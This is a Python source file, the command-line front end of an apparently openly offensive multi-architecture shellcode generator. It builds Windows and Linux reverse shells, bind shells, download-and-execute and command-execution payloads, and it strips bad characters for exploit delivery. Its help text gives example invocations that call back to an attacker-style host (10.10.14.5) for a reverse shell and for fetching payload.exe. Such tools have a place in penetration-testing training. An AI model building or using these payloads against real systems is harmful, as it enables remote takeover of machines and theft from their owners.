
"""
Command Line Interface Module

Handles argument parsing and orchestration of the shellcode generation workflow.
"""

import argparse
import sys
import json

from lib.color_printer import printer

from .generators import WindowsGenerator, LinuxGenerator
from .payloads import get_payload_builder, list_payloads
from .assembler import (
    verify_shellcode_bad_chars,
    print_bad_char_report,
    assemble_to_binary,
    debug_shellcode_opcodes,
    scan_shellcode_for_bad_chars,
    print_bad_char_summary
)
from .formatters import format_output, print_usage_instructions


def parse_bad_chars(bad_chars_str):
    """
    Parse comma-separated hex bytes into a list of integers.

    Args:
        bad_chars_str: Comma-separated hex bytes (e.g., "00,0a,0d")

    Returns:
        list: List of integer byte values
    """
    if not bad_chars_str:
        return [0x00, 0x0a, 0x0d]  # default

    bad_chars = []
    for byte_str in bad_chars_str.split(','):
        byte_str = byte_str.strip()
        try:
            if byte_str.startswith('0x') or byte_str.startswith('0X'):
                bad_chars.append(int(byte_str, 16))
            else:
                bad_chars.append(int(byte_str, 16))
        except ValueError:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text(f"Invalid hex byte: {byte_str}\n", "red")
            sys.exit(1)

    return bad_chars


def load_custom_json(json_path):
    """
    Load a custom payload configuration from a JSON file.

    Args:
        json_path: Path to JSON file

    Returns:
        dict: Payload configuration

    JSON Format:
        {
          "bad_chars": [0, 10, 13],
          "calls": [
            {
              "api": "MessageBoxA",
              "dll": "user32.dll",
              "args": [0, "Hello!", "Title", 0]
            }
          ],
          "exit": true
        }
    """
    try:
        with open(json_path, 'r') as f:
            config = json.load(f)

        # Convert bad_chars list to set if present
        if 'bad_chars' in config:
            config['bad_chars'] = set(config['bad_chars'])
        else:
            config['bad_chars'] = {0x00, 0x0a, 0x0d}  # default

        # Validate required fields
        if 'calls' not in config:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("JSON must contain 'calls' array\n", "red")
            sys.exit(1)

        # Set default exit if not specified
        if 'exit' not in config:
            config['exit'] = True

        return config

    except FileNotFoundError:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"JSON file not found: {json_path}\n", "red")
        sys.exit(1)
    except json.JSONDecodeError as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Invalid JSON format: {e}\n", "red")
        sys.exit(1)
    except Exception as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Error loading JSON: {e}\n", "red")
        sys.exit(1)


def create_parser():
    """Create and configure the argument parser."""
    parser = argparse.ArgumentParser(
        description="Multi-Architecture Shellcode Generator (x86/x64/ARM/ARM64)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Windows x86 MessageBox
  %(prog)s --platform windows --payload messagebox --title "Pwned" --message "Hello!"

  # Windows x86 command execution
  %(prog)s --platform windows --payload winexec --cmd "calc.exe" --arch x86

  # Windows x64 download & execute
  %(prog)s --platform windows --payload download_exec --url "http://10.10.14.5/payload.exe"

  # Windows x86 reverse shell
  %(prog)s --platform windows --payload reverse_shell --host 10.10.14.5 --port 443

  # Windows x86 bind shell (native socket)
  %(prog)s --platform windows --payload bind_shell --port 4444 --shell "cmd.exe"

  # Windows x86 bind shell (PowerShell - simple)
  %(prog)s --platform windows --payload bind_shell_simple --port 4444

  # Linux ARM64 reverse shell
  %(prog)s --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64

  # Linux ARM bind shell
  %(prog)s --platform linux --payload bind_shell --port 4444 --arch arm --shell "/bin/sh"

  # Linux ARM32 execve
  %(prog)s --platform linux --payload execve --cmd "/bin/sh" --arch arm

  # Output as Python bytes
  %(prog)s --platform linux --payload execve --cmd "/bin/sh" --arch arm64 --format python

  # Avoid specific bad characters
  %(prog)s --platform windows --payload winexec --cmd "calc.exe" --bad-chars 00,0a,0d,20 --verify

  # List available payloads
  %(prog)s --list-payloads
        """
    )

    parser.add_argument(
        '--list-payloads',
        action='store_true',
        help='List all available payloads and exit'
    )

    parser.add_argument(
        '--platform',
        choices=['windows', 'linux'],
        help='Target platform: windows or linux'
    )

    parser.add_argument(
        '--payload',
        help='Payload name (use --list-payloads to see available options)'
    )

    parser.add_argument(
        '--arch',
        choices=['x86', 'x64', 'arm', 'arm64'],
        default='x86',
        help='Architecture: x86 (default), x64, arm, arm64'
    )

    parser.add_argument(
        '--bad-chars',
        default='00',
        help='Comma-separated hex bytes to avoid (default: 00)'
    )

    # Payload-specific arguments
    parser.add_argument('--title', help='MessageBox title')
    parser.add_argument('--message', help='MessageBox message')
    parser.add_argument('--cmd', help='Command to execute')
    parser.add_argument('--show-window', type=int, default=1, help='Window visibility (0=hidden, 1=normal)')
    parser.add_argument('--url', help='URL to download from')
    parser.add_argument('--save-path', default='C:\\\\temp\\\\payload.exe', help='Local save path for download')
    parser.add_argument('--host', help='Target IP address for reverse shell')
    parser.add_argument('--port', type=int, help='Port number (target port for reverse shell, listen port for bind shell)')
    parser.add_argument('--shell', help='Shell to execute (e.g., cmd.exe, powershell.exe, /bin/bash)')

    # Custom JSON payload
    parser.add_argument(
        '--json',
        help='Load custom payload from JSON file (replaces --payload and payload-specific args)'
    )

    # Output options
    parser.add_argument(
        '--output',
        help='Output filename (if not specified, prints to stdout)'
    )

    parser.add_argument(
        '--format',
        choices=['asm', 'python', 'c', 'raw', 'pyasm'],
        default='asm',
        help='Output format (default: asm)'
    )

    parser.add_argument(
        '--verify',
        action='store_true',
        help='Verify assembled shellcode for bad characters (requires Keystone)'
    )

    parser.add_argument(
        '--debug-shellcode',
        action='store_true',
        help='Print opcodes line by line to identify bad characters'
    )

    parser.add_argument(
        '--no-exit',
        action='store_true',
        help='Skip ExitProcess at the end (Windows only)'
    )

    return parser


def validate_args(args):
    """Validate argument combinations."""
    if args.list_payloads:
        return  # No validation needed for --list-payloads

    # If using custom JSON, only platform is required
    if args.json:
        if not args.platform:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--platform is required when using --json\n", "red")
            sys.exit(1)
        return  # Skip payload validation for JSON mode

    if not args.platform:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text("--platform is required ", "red", end="")
        printer.print_text("(use --list-payloads to see available options)\n", "dim white")
        sys.exit(1)

    if not args.payload:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text("--payload is required ", "red", end="")
        printer.print_text("(use --list-payloads to see available options)\n", "dim white")
        sys.exit(1)

    # NOTE: All architectures (x86, x64, ARM, ARM64) are now supported on both platforms
    # The generators are OS-specific and handle architecture-specific code generation


def build_payload_config(args, bad_chars):
    """
    Build payload configuration based on arguments.

    Args:
        args: Parsed command-line arguments
        bad_chars: List of bad character bytes

    Returns:
        dict: Payload configuration
    """
    try:
        builder = get_payload_builder(args.platform, args.payload)
    except ValueError as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"{e}\n", "red")
        printer.print_text("\nUse --list-payloads to see available options.\n", "dim white")
        sys.exit(1)

    # Build kwargs based on payload type
    kwargs = {'bad_chars': set(bad_chars)}

    # Common arguments
    if args.payload == 'messagebox':
        if not args.title or not args.message:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--title and --message are required for messagebox payload\n", "red")
            sys.exit(1)
        kwargs['title'] = args.title
        kwargs['message'] = args.message

    elif args.payload == 'winexec':
        if not args.cmd:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--cmd is required for winexec payload\n", "red")
            sys.exit(1)
        kwargs['command'] = args.cmd
        kwargs['show_window'] = args.show_window

    elif args.payload == 'createprocess':
        if not args.cmd:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--cmd is required for createprocess payload\n", "red")
            sys.exit(1)
        kwargs['command'] = args.cmd
        kwargs['show_window'] = args.show_window

    elif args.payload == 'shellexecute':
        if not args.cmd:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--cmd is required for shellexecute payload (file/URL to execute)\n", "red")
            sys.exit(1)
        kwargs['file_or_url'] = args.cmd
        # Optional parameters can be added via additional CLI args if needed
        if hasattr(args, 'operation') and args.operation:
            kwargs['operation'] = args.operation
        if hasattr(args, 'parameters') and args.parameters:
            kwargs['parameters'] = args.parameters
        kwargs['show_cmd'] = args.show_window

    elif args.payload == 'system':
        if not args.cmd:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--cmd is required for system payload\n", "red")
            sys.exit(1)
        kwargs['command'] = args.cmd

    elif args.payload == 'download_exec':
        if not args.url:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--url is required for download_exec payload\n", "red")
            sys.exit(1)
        kwargs['url'] = args.url
        kwargs['save_path'] = args.save_path

    elif args.payload in ('reverse_shell', 'reverse_shell_x64', 'reverse_shell_powershell'):
        if not args.host or not args.port:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text(f"--host and --port are required for {args.payload} payload\n", "red")
            sys.exit(1)
        kwargs['host'] = args.host
        kwargs['port'] = args.port
        if args.shell:
            kwargs['shell'] = args.shell
        if args.platform == 'linux':
            kwargs['arch'] = args.arch

    elif args.payload in ('bind_shell', 'bind_shell_x64'):
        if not args.port:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text(f"--port is required for {args.payload} payload\n", "red")
            sys.exit(1)
        kwargs['port'] = args.port
        if args.shell:
            kwargs['shell'] = args.shell
        if args.platform == 'linux':
            kwargs['arch'] = args.arch

    elif args.payload == 'bind_shell_simple':
        if not args.port:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--port is required for bind_shell_simple payload\n", "red")
            sys.exit(1)
        kwargs['port'] = args.port
        if args.cmd:
            kwargs['command'] = args.cmd

    elif args.payload == 'execve':
        if not args.cmd:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--cmd is required for execve payload\n", "red")
            sys.exit(1)
        kwargs['command'] = args.cmd
        kwargs['arch'] = args.arch
        if args.shell:
            kwargs['shell'] = args.shell

    return builder(**kwargs)


def generate_shellcode(args, config):
    """
    Generate shellcode based on platform and configuration.

    Args:
        args: Parsed command-line arguments
        config: Payload configuration dict

    Returns:
        str: Generated assembly code
    """
    if args.platform == 'windows':
        # Windows shellcode generation (x86, x64, ARM, ARM64)
        bad_chars = config.get('bad_chars', set())
        generator = WindowsGenerator(bad_chars, args.arch)
        return generator.generate(config)

    elif args.platform == 'linux':
        # Linux shellcode generation (x86, x64, ARM, ARM64)
        bad_chars = config.get('bad_chars', set())
        generator = LinuxGenerator(bad_chars, args.arch)
        return generator.generate(config)

    else:
        raise ValueError(f"Unsupported platform: {args.platform}")


def run_cli():
    """Main CLI entry point."""
    parser = create_parser()
    args = parser.parse_args()

    # Handle --list-payloads
    if args.list_payloads:
        print(list_payloads())
        sys.exit(0)

    # Validate arguments
    validate_args(args)

    # Build payload configuration
    if args.json:
        # Load custom payload from JSON file
        config = load_custom_json(args.json)

        # Check if --bad-chars was explicitly provided (not just the default)
        # The default is '00', so if user provides something else, they want to override
        if args.bad_chars != '00':
            # CLI --bad-chars overrides JSON bad_chars
            bad_chars = parse_bad_chars(args.bad_chars)
            config['bad_chars'] = set(bad_chars)
            printer.print_text("ℹ ", "cyan", end="")
            printer.print_text(f"Using bad_chars from CLI (overriding JSON): ", "dim white", end="")
            printer.print_text(f"{{{', '.join(f'0x{b:02x}' for b in sorted(bad_chars))}}}\n", "yellow")
        else:
            # Use bad_chars from JSON
            bad_chars = list(config.get('bad_chars', {0x00, 0x0a, 0x0d}))
            printer.print_text("ℹ ", "cyan", end="")
            printer.print_text(f"Using bad_chars from JSON: ", "dim white", end="")
            printer.print_text(f"{{{', '.join(f'0x{b:02x}' for b in sorted(bad_chars))}}}\n", "yellow")
    else:
        # Build payload from CLI arguments
        bad_chars = parse_bad_chars(args.bad_chars)
        do_exit = not args.no_exit
        config = build_payload_config(args, bad_chars)

        # Set exit flag for Windows payloads (only if user explicitly set --no-exit)
        # Don't override reverse_shell which has its own exit handling via WaitForSingleObject
        if args.platform == 'windows' and 'exit' in config:
            if args.payload != 'reverse_shell':
                config['exit'] = do_exit
            elif args.no_exit:
                # Allow user to force no exit even for reverse_shell
                config['exit'] = False

    # Generate shellcode
    try:
        asm_code = generate_shellcode(args, config)
    except Exception as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Error generating shellcode: {e}\n", "red")
        sys.exit(1)

    # Format output
    try:
        output_data = format_output(asm_code, args.format, args.arch, args.platform)
    except Exception as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Error formatting output: {e}\n", "red")
        sys.exit(1)

    # Write to file or stdout
    if args.output:
        # Write to file if --output is specified
        if args.format == 'raw':
            # Write binary to file
            with open(args.output, 'wb') as f:
                f.write(output_data)
            printer.print_text("✓ ", "bold green", end="")
            printer.print_text(f"Raw binary written to: {args.output}\n", "green")
        else:
            # Write text to file
            with open(args.output, 'w') as f:
                f.write(output_data)
            printer.print_text("✓ ", "bold green", end="")
            printer.print_text(f"Output written to: {args.output}\n", "green")
    else:
        # Print to stdout if no --output specified
        if args.format == 'raw':
            # For raw binary, write to stdout in binary mode
            sys.stdout.buffer.write(output_data)
        else:
            # For text formats, print to stdout
            print(output_data)

    # Automatically scan for common bad characters (similar to grep -E '00|09|0A|0B|0C|0D|20')
    try:
        shellcode_bytes = assemble_to_binary(asm_code, args.arch)
        scan_result = scan_shellcode_for_bad_chars(shellcode_bytes)
        print_bad_char_summary(scan_result)
    except Exception as e:
        # If assembly fails, just warn but don't stop (user may be using raw format)
        print(f"\n[!] Warning: Could not scan for bad characters: {str(e)}")
        print(f"    (This is informational only - shellcode generation was successful)")

    # Debug shellcode opcodes if requested (run before verify so it always shows)
    if args.debug_shellcode:
        debug_shellcode_opcodes(asm_code, args.arch, bad_chars)

    # Verify shellcode for bad characters if requested
    if args.verify:
        print("\n" + "="*72)
        print("VERIFYING ASSEMBLED SHELLCODE...")
        print("Assembler: Keystone Engine")
        print("="*72)
        try:
            shellcode_bytes = assemble_to_binary(asm_code, args.arch)
            is_clean, report = verify_shellcode_bad_chars(shellcode_bytes, bad_chars)
            print_bad_char_report(report, bad_chars)

            if not is_clean:
                sys.exit(1)  # Exit with error code if bad chars found

        except Exception as e:
            print(f"\n✗ Verification failed: Could not assemble shellcode")
            print(f"   {str(e)}")
            sys.exit(1)

    # Print usage instructions
    print_usage_instructions(args.output, args.format, args.payload, args.verify)
